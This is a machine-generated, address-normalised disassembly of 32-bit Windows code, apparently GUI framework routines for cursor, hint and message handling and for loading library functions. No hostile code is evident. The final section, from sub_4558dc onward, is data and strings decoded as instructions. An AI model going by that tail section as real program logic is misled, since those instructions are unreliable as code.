sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_454868
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_452518
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_4525c4
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_452b6c
test eax eax
je r-xdata
mov eax esi
call sub_452590
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_454610
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_452e3c
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_452b6c
mov edx [ ebx + 0x20 ]
call sub_452ac4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_454868
pop ecx
sub_4548e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_452574
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_452574
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_452b6c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_4548e8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_454610
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_452e3c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_452770
mov eax edi
call sub_452b60
test eax eax
je r-xdata
mov eax edi
call sub_452b6c
mov esi eax
mov eax esi
call sub_452a88
push eax
mov eax esi
call sub_4525c4
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_452b60
call sub_452a88
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_452a88
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_452ab0
mov eax esi
call sub_452a88
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_452ab0
mov eax edi
call sub_452b6c
call sub_452b00
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_4525c4
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_452ab0
mov eax edi
call sub_452b60
call sub_452b00
mov bl 0x1
jmp r-xdata
sub_454a20
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_452dd4
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_416efc
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4535c8
test eax eax
je r-xdata
push ebp
call sub_454868
pop ecx
push ebp
call sub_4548e8
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_4547ec
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_454aa8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_452654
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_452654
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_45479c
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_45479c
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_454b38
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_454f10
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406b30
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4535c8
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45456c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b30
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4535c8
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_449964
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454f17
lea eax [ ebp - 0x48 ]
call sub_403f50
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_45071c
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_448680
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_44ab20
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f50
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_454a20
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44f24c
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_454620
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406b30
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_454aa8
pop ecx
mov eax [ ebp - 0x4 ]
call sub_454620
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b30
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4535c8
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_449d40
jmp r-xdata
mov eax edi
call sub_4660f4
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4535c8
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4497c0
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_449e20
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403fa4
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45450c
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4677f4
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_45071c
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_44a4c8
jmp r-xdata
sub_454f20
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_455094
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_454fb0
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45506c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_455014
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_455044
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406c1c
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_45506c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454fe0
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_455094
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_454ff8
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_455014
pop ebx
retn
mov eax ebx
call sub_455044
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_4550f8
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45525e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_45537c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_455360
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_455360
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_45546c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403154
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403154
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403154
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403154
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f50
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f50
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4554f4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45566c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408df4
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403fa4
mov eax [ rw-data ]
call sub_404410
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408df4
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403fa4
mov eax [ rw-data ]
call sub_404410
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_404410
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41881c
mov [ rw-data ] eax
call sub_4550f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_454f20
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4670d0
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4681b4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_469d9c
mov ecx r-xdata
mov edx sub_446f30
mov eax [ r-xdata ]
call sub_417d70
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455673
lea eax [ ebp - 0x10 ]
call sub_403f50
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_4556dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45573b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455742
retn
mov eax rw-data
call sub_40d130
call sub_45546c
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_4049cc
mov eax rw-data
call sub_403f50
mov eax rw-data
call sub_403f50
sub_455744
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4557ca
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4557d1
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_4554f4
mov eax [ r-xdata ]
call sub_417be4
mov eax [ r-xdata ]
call sub_417c84
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417c30
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417c30
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417c30
sub_4558dc
pop ebp
inc ebp
add [ eax + 0x5d ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43080002 ] al
popad
je r-xdata
add [ esp + edx ] ch
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
outsd
jb r-xdata
add [ eax ] ah
pop edi
inc ebp
add [ ecx ] dh
inc ebp
add [ eax + 0x60 ] dh
inc ebp
add [ eax + eax ] al
std
mov eax eax
inc esp
pop ecx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 2 + 0x45 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc ebp
add [ esi + 0x68004559 ] dl
add [ eax ] al
add [ esp + ebp * 2 ] ah
inc ecx
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
sub_455986
fcomp [ edi + 0x45 ]
add [ eax ] ah
inc ebp
add [ eax ] ch
bound eax [ ebp ]
dec eax
bound eax [ ebp ]
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax + 0x18004197 ] dh
cmpsd [ esi ] [ edi ]
inc ecx
add [ edi + 0x41 ] cl
add [ eax - 0x59 ] dl
inc ecx
add [ edi + 0x41 ] dl
add [ ebx + ebx * 4 - 0x5737ffbf ] bl
inc ecx
add [ ecx + ebp * 4 ] ah
inc ecx
add al bh
test eax 0xa2e80041
inc ecx
add [ edx + ebp * 4 ] dh
inc ecx
add [ eax + 0x300041aa ] ch
push 0x45
add al bl
movsb [ edi ] [ esi ]
inc ecx
add al bh
xchg esi eax
inc ecx
add [ ebp + 0x41 ] dh
add [ ebp - 0x59dfffbf ] dh
inc ecx
add [ eax - 0x65 ] cl
inc ecx
add [ eax - 0x23ffbe59 ] dh
popfd
inc ecx
add [ eax - 0x13ffbe62 ] dh
cmpsd [ esi ] [ edi ]
inc ecx
add ah bh
cmpsd [ esi ] [ edi ]
inc ecx
add [ edi + ebx * 4 ] dl
inc ecx
add [ eax - 0x61 ] ch
inc ecx
add [ eax ] dl
inc ecx
add [ ecx - 0x5dfbffbf ] ch
inc ecx
add [ eax + 0x3c0041a2 ] bl
movsd [ edi ] [ esi ]
inc ecx
add [ eax - 0x5b ] bl
inc ecx
add [ eax - 0x58 ] dl
inc ecx
add [ eax + 0x600041a6 ] ah
stosb [ edi ]
inc ecx
add [ eax - 0x56 ] dh
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
and [ ebp + 0x41 ] ch
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x5a200000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
pop edx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3000455a ] bh
add [ eax ] al
add ah ch
bound eax [ ecx ]
test [ ebx ] dh
inc eax
add [ eax - 0x6bffbfcd ] dl
xor eax [ eax ]
cwde
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
add ah cl
pop ebx
inc ebp
add [ eax ] dl
pop esp
inc ebp
add [ eax ] al
inc ebx
jne r-xdata
add [ eax ] al
int3
dec esp
imul esi [ ebx + 0x74 ] 0x5accc08b
inc ebp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
pop ebx
inc ebp
out dx al
inc ebx
jne r-xdata
add ah bh
pop ebx
inc ebp
add [ eax - 0x2c000000 ] ah
push edi
inc ebp
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
dec esp
imul esi [ ebx + 0x74 ] r-xdata
fsub [ ebx + 0x41 ]
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x5af40000
inc ebp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ch
jbe r-xdata
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ebx + 0x64040045 ] dh
inc ebp
add [ ebx + edx + 0x42 ] al
add [ ebx + ecx * 4 + 0x141c0041 ] ch
outsb
je r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
add al [ ecx ]
pop es
dec eax
imul ebp [ esi + 0x74 ] 0x6727453
push ebx
je r-xdata
add [ eax ] al
add al [ eax ]
out dx al
inc edx
add [ eax + 0x19 ] bh
inc edx
add [ ebp + ebx * 2 + 0x45 ] dh
add al dl
push 0x17540045
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax + 0x63 ] ah
inc ebp
add [ eax ] bh
sbb al [ edx ]
fcomp [ ecx ]
inc edx
add [ eax + 0x19 ] dh
inc edx
add [ eax + 0x74004219 ] ah
sbb [ edx ] eax
enter 0x455e 0x0
clc
inc bp
add [ eax + 0x24004566 ] dl
push 0x45
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
mov eax [ ecx ]
sbb al 0x14
imul ebp [ esi + 0x67 ] 0x61430701
outsb
push ebx
push 0x4207776f
outsd
outsd
insb
popad
outsb
add [ eax + edx + 0x10000040 ] dl
inc eax
add [ eax + 0x5b ] bh
inc ebp
add [ eax ] al
add [ eax ] al
sub_455c71
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax ] ch
sbb [ edx ] al
and al 0x18
inc edx
add [ eax + ebx + 0x42 ] bl
add [ eax + ebx + 0x18900042 ] bh
inc edx
add al al
sbb [ edx ] al
loopne r-xdata
bound eax [ ebp ]
mov eax 0xcc004562
bound eax [ ebp ]
loopne r-xdata
inc edx
add [ eax + ebx + 0x42 ] dh
add al cl
sbb [ edx ] al
push 0x7c004562
bound eax [ ebp ]
nop
bound eax [ ebp ]
movsb [ edi ] [ esi ]
add [ ebx - 0x31d7f2d ] cl
inc ebp
add ah dh
bound eax [ ebp ]
or [ ebx + 0x45 ] ah
add [ ebx ] bl
inc ebp
add [ eax ] dh
